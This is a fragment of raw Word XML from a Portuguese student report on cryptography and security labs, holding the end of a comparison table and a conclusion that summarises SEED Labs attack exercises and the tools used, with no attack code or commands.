                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Vulnerável a DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="39A108BF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SIM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="71D95409" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>NÃO</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="76B830A5" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="1226E8CF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Desempenho</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="79BE0DC9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Fraco (pode parar)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="0B23C7E4" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Excelente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="4F9EDB8A" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="132F1A56" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Nível de segurança</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="11121A67" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Teoricamente mais</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="7E8BADFE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Praticamente equivalente</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="004253CC" w14:paraId="1FB0D6DF" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2825" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="1C591720" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Uso recomendado</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2820" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="20D8DFDF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Raramente necessário</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2839" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="4472C4"/>
            </w:tcBorders>
            <w:tcMar>
              <w:top w:w="0" w:type="dxa"/>
              <w:left w:w="108" w:type="dxa"/>
              <w:bottom w:w="0" w:type="dxa"/>
              <w:right w:w="108" w:type="dxa"/>
            </w:tcMar>
          </w:tcPr>
          <w:p w14:paraId="3B113F29" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="22"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RECOMENDADO</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60C8141E" w14:textId="77777777" w:rsidR="00842992" w:rsidRDefault="00842992" w:rsidP="00842992">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2FEDB8" w14:textId="76B8B550" w:rsidR="004253CC" w:rsidRDefault="00842992" w:rsidP="00842992">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
      <w:bookmarkStart w:id="267" w:name="_Toc213882004"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Conclusão</w:t>
      </w:r>
      <w:bookmarkEnd w:id="267"/>
    </w:p>
    <w:p w14:paraId="2CEF4324" w14:textId="77777777" w:rsidR="00842992" w:rsidRDefault="00842992" w:rsidP="00842992"/>
    <w:p w14:paraId="5B06D130" w14:textId="6C3AF5A9" w:rsidR="00842992" w:rsidRPr="00842992" w:rsidRDefault="00842992" w:rsidP="00842992">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve">Este relatório resume um percurso de aprendizagem que combinou teoria e prática no estudo da criptografia e da segurança informática, explorando as tecnologias que protegem a confidencialidade, integridade e autenticidade das comunicações digitais. Foram analisados algoritmos e protocolos como </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>DES, AES, TLS, Diffie-Hellman e RSA,</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve"> e testadas vulnerabilidades reais através de laboratórios SEED Labs, incluindo ataques como </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Man-in-the-Middle, reentrancy em smart contracts, padding oracle e falhas em geradores pseudoaleatórios</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F93FA87" w14:textId="111869E5" w:rsidR="00842992" w:rsidRPr="00842992" w:rsidRDefault="00842992" w:rsidP="00842992">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve">Entre as experiências, o laboratório </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Anti-AntiXerox!</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve"> destacou-se por integrar técnicas de criptografia, análise forense e resolução de enigmas num desafio prático, mostrando como a segurança requer tanto conhecimento técnico como criatividade e persistência. A utilização de ferramentas como </w:t>
      </w:r>
      <w:r>
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>OpenSSL, Python, Docker, hashcat, exiftool</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve"> e ambientes </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Ethereum</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve"> permitiu consolidar competências essenciais e compreender melhor o equilíbrio entre teoria e aplicação.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFEC995" w14:textId="77777777" w:rsidR="00842992" w:rsidRPr="00842992" w:rsidRDefault="00842992" w:rsidP="00842992">
      <w:pPr>
        <w:ind w:firstLine="708"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve">Este trabalho reforça que a cibersegurança não depende </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>apenas da força dos algoritmos, mas também da responsabilidade ética de quem os utiliza</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t xml:space="preserve">. Num contexto em que a </w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>computação quântica e a complexidade dos sistemas trazem novos riscos</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:t>, a aprendizagem contínua e a adaptação tornam-se indispensáveis. No final, esta experiência representa não apenas uma base técnica sólida, mas também uma forma de pensar: proteger sistemas e dados com rigor, curiosidade e sentido de responsabilidade.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287435B2" w14:textId="281C4CDF" w:rsidR="00842992" w:rsidRPr="00842992" w:rsidRDefault="00842992" w:rsidP="00842992"/>
    <w:sectPr w:rsidR="00842992" w:rsidRPr="00842992">
      <w:headerReference w:type="default" r:id="rId37"/>
      <w:footerReference w:type="default" r:id="rId38"/>
      <w:pgSz w:w="11906" w:h="16838"/>
      <w:pgMar w:top="1417" w:right="1701" w:bottom="1417" w:left="1701"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98ED" w14:textId="77777777" w:rsidR="00CD0185" w:rsidRDefault="00CD0185">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="485D1D97" w14:textId="77777777" w:rsidR="00CD0185" w:rsidRDefault="00CD0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Mono">
    <w:altName w:val="Calibri"/>
    <w:charset w:val="00"/>
    <w:family w:val="modern"/>
    <w:pitch w:val="fixed"/>
  </w:font>
  <w:font w:name="FreeSans">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2334" w14:textId="77777777" w:rsidR="00880EA6" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Rodap"/>
    </w:pPr>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1F497D"/>
      </w:rPr>
      <w:t>|||</w:t>
    </w:r>
    <w:r>
      <w:t xml:space="preserve"> ISTEC do Porto - Instituto Superior de Tecnologias Avançadas do Porto</w:t>
    </w:r>
    <w:r>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:lang w:val="pt-BR"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:lang w:val="pt-BR"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:lang w:val="pt-BR"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:lang w:val="pt-BR"/>
      </w:rPr>
      <w:t>1</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:rStyle w:val="Fontepargpadro"/>
        <w:lang w:val="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2F751" w14:textId="77777777" w:rsidR="00CD0185" w:rsidRDefault="00CD0185">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7AECDCA8" w14:textId="77777777" w:rsidR="00CD0185" w:rsidRDefault="00CD0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A5DE" w14:textId="77777777" w:rsidR="00880EA6" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Cabealho"/>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="42B79E3D" wp14:editId="193E734A">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="margin">
            <wp:posOffset>-550331</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="margin">
            <wp:posOffset>-702734</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="2381015" cy="601135"/>
          <wp:effectExtent l="0" t="0" r="235" b="0"/>
          <wp:wrapSquare wrapText="bothSides"/>
          <wp:docPr id="871878647"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381015" cy="60113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053208E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="005320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30D2F29"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CEA0680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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="05F81D1F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D660D0A6"/>
    <w:styleLink w:val="LFO29"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Commarcadores"/>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07F9044A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6D1C52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8583BC8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4308FED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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0C4A24BC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="808C09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121C73F4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="70FE452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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="16764ED7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BBC86C82"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1440" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2160" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2880" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3600" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5040" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5760" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6480" w:hanging="480"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:cs="Symbol"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1CCE4BEE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4ABA179E"/>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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1F4018CD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F82EA954"/>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225C67EF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00F068E8"/>
    <w:lvl w:ilvl="0">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="405" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:eastAsia="Calibri" w:hAnsi="Wingdings" w:cs="Calibri"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1125" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1845" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2565" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3285" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4005" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4725" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5445" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6165" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="28CC60CE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1CCC3D7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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2C614FF1"/>
    <w:multiLevelType w:val="multilevel"/>
